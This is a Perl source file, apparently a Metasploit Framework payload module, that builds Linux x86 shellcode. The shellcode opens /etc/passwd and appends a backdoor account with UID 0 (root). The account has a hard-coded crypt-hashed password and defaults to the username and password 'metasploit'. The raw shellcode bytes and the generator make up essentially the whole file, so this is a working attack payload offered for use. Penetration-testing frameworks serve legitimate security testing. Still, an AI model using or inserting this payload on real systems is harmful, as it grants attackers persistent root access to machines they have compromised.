
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::linux_ia32_adduser;
use strict;
use base 'Msf::PayloadComponent::NoConnection';
use Pex::x86;

my $info =
{
  'Name'         => 'Linux IA32 Add User',
  'Version'      => '$Revision$',
  'Description'  => 'Create a new user with UID 0',
  'Authors'      => [ 'vlad902 <vlad902 [at] gmail.com>',
                      'spoonm <ninjatools [at] hush.com>',
                      'skape <mmiller [at] hick.org>' ],
  'Arch'         => [ 'x86' ],
  'Priv'         => 1,
  'OS'           => [ 'linux' ],
  'Size'         => '',
  'UserOpts'     =>
   {
      'LUSER' => [1, 'DATA', 'The username to create', 'metasploit'],
      'LPASS' => [1, 'DATA', 'The password for this user', 'metasploit'],
      'LSHELL' => [0, 'DATA', 'The shell for this user', '/bin/sh'],
   },
};

sub new {
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);

  $self->_Info->{'Size'} = $self->_GenSize;
  return($self);
}

sub Build {
  my $self = shift;
  return($self->Generate());
}

sub Generate {
  my $self = shift;
  my $user = $self->GetVar('LUSER') || 'metasploit';
  my $pass = $self->GetVar('LPASS');
  my $shell = $self->GetVar('LSHELL') || '/bin/sh';
  my $str = $user . ":" . crypt($pass, "AA") . ":0:0::/:" . $shell . "\n";

  my $shellcode =
    "\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58".
    "\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70".
    "\x61\x68\x2f\x65\x74\x63\x89\xe3\x41\xb5\x04\xcd".
    "\x80\x93".
    Pex::x86::call(length($str)).
    $str.
    "\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58".
    "\xcd\x80";

  return($shellcode);
}

sub _GenSize {
  my $self = shift;
  my $bin = $self->Generate('');
  return(length($bin));
}

1;

